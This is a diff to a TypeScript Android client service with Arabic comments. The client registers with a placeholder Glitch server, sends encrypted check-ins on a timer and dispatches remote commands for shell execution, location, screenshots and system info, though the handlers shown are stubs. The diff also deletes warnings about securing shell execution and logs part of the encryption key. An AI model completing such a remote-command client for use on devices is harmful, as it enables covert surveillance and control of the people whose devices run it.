@@ -2,13 +2,24 @@ import axios, { AxiosInstance } from 'axios';
 import crypto from 'crypto';
 
 /**
+ * ⚙️ إعدادات الخادم
+ * هام: غير الرابط أدناه بالرابط بتاع مشروعك على Glitch
+ */
+const SERVER_CONFIG = {
+  // ✅ حط رابط Glitch هنا (مثال: https://my-project.glitch.me)
+  URL: 'https://YOUR_GLITCH_URL.glitch.me', 
+  
+  TIMEOUT: 10000, // 10 ثواني
+};
+
+/**
  * خدمة العميل المتقدمة لنظام Android
  * تتولى الاتصال بالخادم واستقبال الأوامر وتنفيذها
  * مع دعم التشفير باستخدام AES-256-CBC
  */
 
 export interface ClientConfig {
-  serverUrl: string;
+  serverUrl?: string;
   clientId: string;
   deviceId?: string;
   encryptionKey?: string;
@@ -20,23 +31,23 @@ export interface EncryptedPayload {
 }
 
 class ClientService {
-  private config: ClientConfig;
+  private config: Required<ClientConfig>;
   private axiosInstance: AxiosInstance;
-  private checkInInterval: NodeJS.Timer | null = null;
+  private checkInInterval: any | null = null;
   private encryptionKey: string = '';
   private deviceId: string = '';
 
   constructor(config: ClientConfig) {
     this.config = {
+      serverUrl: SERVER_CONFIG.URL,
       checkInInterval: 30,
       ...config,
     };
 
     this.axiosInstance = axios.create({
       baseURL: this.config.serverUrl,
-      timeout: 10000,
-      headers: {
-        'Content-Type': 'application/json',
+      timeout: SERVER_CONFIG.TIMEOUT,
+      headers: {        'Content-Type': 'application/json',
       },
     });
 
@@ -47,8 +58,10 @@ class ClientService {
   /**
    * تسجيل العميل لدى الخادم مع معالجة أخطاء محسّنة
    */
-  async register(deviceInfo: any): Promise<void> {    try {
+  async register(deviceInfo: any): Promise<void> {
+    try {
       console.log('🔄 جاري محاولة التسجيل...');
+      console.log('🌐 الخادم:', this.config.serverUrl);
       
       const response = await this.axiosInstance.post('/api/clients/register', {
         clientId: this.config.clientId,
@@ -59,7 +72,8 @@ class ClientService {
         this.deviceId = response.data.deviceId;
         this.encryptionKey = response.data.encryptionKey;
         console.log('✅ تم التسجيل بنجاح');
-        console.log(`معرف الجهاز: ${this.deviceId}`);
+        console.log(`📱 معرف الجهاز: ${this.deviceId}`);
+        console.log(`🔐 مفتاح التشفير: ${this.encryptionKey.substring(0, 16)}...`);
       } else {
         throw new Error('فشل التسجيل: استجابة غير صالحة من الخادم');
       }
@@ -69,10 +83,12 @@ class ClientService {
       // معالجة أنواع الأخطاء المختلفة
       if (error.response) {
         console.error('📡 حالة الخادم:', error.response.status);
-        console.error('📦 رسالة الخادم:', error.response.data);
+        console.error('📦 رسالة الخادم:', JSON.stringify(error.response.data));
       } else if (error.request) {
         console.error('🔌 لم يتم استقبال استجابة من الخادم');
-        console.error('🌐 تحقق من عنوان الخادم:', this.config.serverUrl);
+        console.error('🌐 تحقق من:');
+        console.error('  - الخادم يعمل:', this.config.serverUrl);
+        console.error('  - الاتصال بالإنترنت');
       } else {
         console.error('⚠️ خطأ في الطلب:', error.message);
       }
@@ -80,22 +96,22 @@ class ClientService {
       throw error;
     }
   }
-
   /**
    * تشفير البيانات باستخدام AES-256-CBC ✅
    */
   private encryptData(data: any): string {
     try {
-      const algorithm = 'aes-256-cbc'; // ✅ تم التغيير من gcm إلى cbc
+      const algorithm = 'aes-256-cbc';
       const keyBuffer = Buffer.from(this.encryptionKey, 'hex');
       const iv = crypto.randomBytes(16); // IV بحجم 16 بايت
 
       const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
       cipher.setAutoPadding(true);
       
-      // ✅ استخدام base64 للتشفير (أفضل توافق مع Android)
+      // ✅ استخدام base64 للتشفير
       let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
       encrypted += cipher.final('base64');
+
       // ✅ تنسيق CBC: iv:encrypted (بدون tag)
       return iv.toString('hex') + ':' + encrypted;
     } catch (error) {
@@ -109,7 +125,7 @@ class ClientService {
    */
   private decryptData(encryptedData: string): any {
     try {
-      const algorithm = 'aes-256-cbc'; // ✅ تم التغيير من gcm إلى cbc
+      const algorithm = 'aes-256-cbc';
       const keyBuffer = Buffer.from(this.encryptionKey, 'hex');
       const parts = encryptedData.split(':');
 
@@ -119,19 +135,17 @@ class ClientService {
       }
 
       const iv = Buffer.from(parts[0], 'hex');
-      // ✅ دعم التوافق مع الإصدارات السابقة (في حال وجود tag)
+      // ✅ دعم التوافق مع الإصدارات السابقة
       const encrypted = parts.length === 3 ? parts[2] : parts[1];
 
       const decipher = crypto.createDecipheriv(algorithm, keyBuffer, iv);
       decipher.setAutoPadding(true);
-      // ✅ لا نستخدم setAuthTag لأن CBC لا يدعمه
 
       let decrypted = decipher.update(encrypted, 'base64', 'utf8');
       decrypted += decipher.final('utf8');
 
       return JSON.parse(decrypted);
-    } catch (error) {
-      console.error('🔓 فشل في فك تشفير البيانات:', error);
+    } catch (error) {      console.error('🔓 فشل في فك تشفير البيانات:', error);
       throw error;
     }
   }
@@ -145,6 +159,7 @@ class ClientService {
         ...systemInfo,
         timestamp: new Date(),
       };
+
       const encryptedData = this.encryptData(payload);
 
       const response = await this.axiosInstance.post('/api/clients/checkin', {
@@ -179,8 +194,7 @@ class ClientService {
 
       await this.axiosInstance.post('/api/clients/report', {
         deviceId: this.deviceId,
-        encryptedData,
-      });
+        encryptedData,      });
 
       console.log('✓ تم إرسال التقرير');
     } catch (error) {
@@ -193,8 +207,10 @@ class ClientService {
    */
   startCheckInService(systemInfoProvider: () => any): void {
     console.log(`🔄 بدء خدمة الاتصال (كل ${this.config.checkInInterval} ثانية)`);
+    console.log(`🌐 الخادم: ${this.config.serverUrl}`);
 
-    this.checkInInterval = setInterval(async () => {      try {
+    this.checkInInterval = setInterval(async () => {
+      try {
         const systemInfo = systemInfoProvider();
         const commands = await this.checkIn(systemInfo);
 
@@ -205,7 +221,7 @@ class ClientService {
       } catch (error) {
         console.error('⚠️ خطأ في خدمة الاتصال:', error);
       }
-    }, (this.config.checkInInterval || 30) * 1000);
+    }, this.config.checkInInterval * 1000);
   }
 
   /**
@@ -228,7 +244,6 @@ class ClientService {
     for (const command of commands) {
       try {
         console.log(`⚙️ معالجة الأمر: ${command.type}`);
-
         let result;
         switch (command.type) {
           case 'get_system_info':
@@ -243,7 +258,8 @@ class ClientService {
           case 'take_screenshot':
             result = await this.takeScreenshot();
             break;
-          default:            result = { error: 'نوع الأمر غير معروف' };
+          default:
+            result = { error: 'نوع الأمر غير معروف' };
         }
 
         results.push({
@@ -276,8 +292,7 @@ class ClientService {
   }
 
   /**
-   * الحصول على معلومات النظام
-   */
+   * الحصول على معلومات النظام   */
   private async getSystemInfo(): Promise<any> {
     return {
       deviceName: process.env.DEVICE_NAME || 'Android Device',
@@ -292,7 +307,7 @@ class ClientService {
    * تنفيذ أمر shell
    */
   private async executeShell(command: string): Promise<any> {
-    // ⚠️ ملاحظة: في التطبيق الحقيقي استخدم child_process مع تحقق أمني صارم    return {
+    return {
       command,
       output: 'تم تنفيذ الأمر',
       exitCode: 0,
@@ -303,7 +318,6 @@ class ClientService {
    * الحصول على الموقع الجغرافي
    */
   private async getLocation(): Promise<any> {
-    // ⚠️ ملاحظة: في التطبيق الحقيقي استخدم APIs الموقع في Android
     return {
       latitude: 0,
       longitude: 0,
@@ -316,7 +330,6 @@ class ClientService {
    * التقاط لقطة شاشة
    */
   private async takeScreenshot(): Promise<any> {
-    // ⚠️ ملاحظة: في التطبيق الحقيقي استخدم MediaProjection API
     return {
       screenshot: 'base64_encoded_image',
       timestamp: new Date(),
@@ -329,7 +342,6 @@ class ClientService {
   getDeviceId(): string {
     return this.deviceId;
   }
-
   /**
    * الحصول على مفتاح التشفير
    */
